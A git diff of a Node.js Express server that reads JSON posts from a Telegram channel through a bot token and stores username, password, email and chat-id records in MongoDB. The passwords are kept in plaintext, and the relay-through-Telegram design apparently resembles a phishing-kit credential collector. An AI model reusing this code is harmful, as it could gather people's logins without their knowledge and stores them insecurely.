@@ -72,6 +72,9 @@ app.post("/storeData", async (req, res) => {
 
 app.get("/fetchData", async (req, res) => {
   try {
+    await client.connect();
+    console.log("Connected successfully to server");
+
     const resultDict = {};
     const findResult = collection.find({ chat_id: TELEGRAM_CHAT_ID });
     await findResult.forEach((doc) => {
@@ -89,6 +92,9 @@ app.get("/fetchData", async (req, res) => {
   } catch (error) {
     console.error("Error fetching data from Telegram:", error);
     res.status(500).send("Failed to fetch data from Telegram");
+  } finally {
+    client.close();
+    console.log("Server closed");
   }
 });
 
@@ -99,57 +105,90 @@ app.listen(port, () => {
 app.get("/editData", async (req, res) => {
   const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
   try {
-      const fetch = await import("node-fetch");
-      const response = await fetch.default(telegramApiUrl, {
-          method: "GET",
-          headers: {
-              "Content-Type": "application/json",
-          },
-      });
+    const fetch = await import("node-fetch");
+    const response = await fetch.default(telegramApiUrl, {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json",
+      },
+    });
 
-      if (!response.ok) {
-          throw new Error("Failed to fetch data from Telegram");
-      }
+    if (!response.ok) {
+      throw new Error("Failed to fetch data from Telegram");
+    }
 
-      const data = await response.json();
-      console.log('Raw data from Telegram:', data);
+    const data = await response.json();
+    console.log("Raw data from Telegram:", data);
 
-      const messages = data.result
-      .filter(update => (update.channel_post && update.channel_post.text) || (update.edited_channel_post && update.edited_channel_post.text))
-      .map(update => {
+    const messages = data.result
+      .filter(
+        (update) =>
+          (update.channel_post && update.channel_post.text) ||
+          (update.edited_channel_post && update.edited_channel_post.text)
+      )
+      .map((update) => {
         if (update.channel_post) {
           return update.channel_post.text;
         } else if (update.edited_channel_post) {
           return update.edited_channel_post.text;
         }
       })
-      .filter(text => {
+      .filter((text) => {
         try {
           JSON.parse(text);
           return true;
-              } catch (e) {
-                  return false;
-              }
-          });
+        } catch (e) {
+          return false;
+        }
+      });
 
-      console.log('Filtered messages:', messages);
+    console.log("Filtered messages:", messages);
 
-      const entries = messages.reduce((acc, message) => {
-          const data = JSON.parse(message);
-          data.forEach(item => {
-              if (!acc[item.id]) {
-                  acc[item.id] = {};
-              }
-              acc[item.id][item.type] = item.value;
-          });
-          return acc;
-      }, {});
+    const entries = messages.reduce((acc, message) => {
+      const data = JSON.parse(message);
+      data.forEach((item) => {
+        if (!acc[item.id]) {
+          acc[item.id] = {};
+        }
+        acc[item.id][item.type] = item.value;
+      });
+      return acc;
+    }, {});
 
-      console.log('Processed entries:', entries);
+    console.log("Processed entries:", entries);
 
-      res.status(200).json(entries);
+    await client.connect();
+    console.log("Connected successfully to server");
+
+    async function insertEntries(entries) {
+      const documents = [];
+
+      for (const [text_id, entry] of Object.entries(entries)) {
+        const document = {
+          chat_id: entry.chatid,
+          text_id: text_id,
+          text: [
+            { id: text_id, type: "username", value: entry.username },
+            { id: text_id, type: "password", value: entry.password },
+            { id: text_id, type: "email", value: entry.email },
+            { id: text_id, type: "chatid", value: entry.chatid },
+          ],
+        };
+        documents.push(document);
+      }
+
+      const insertResult = await collection.insertMany(documents);
+      return insertResult;
+    }
+
+    const insertResult = await insertEntries(entries);
+
+    res.status(200).json(entries);
   } catch (error) {
-      console.error("Error fetching data from Telegram:", error);
-      res.status(500).send("Failed to fetch data from Telegram");
+    console.error("Error fetching data from Telegram:", error);
+    res.status(500).send("Failed to fetch data from Telegram");
+  } finally {
+    await client.close();
+    console.log("Server closed");
   }
 });
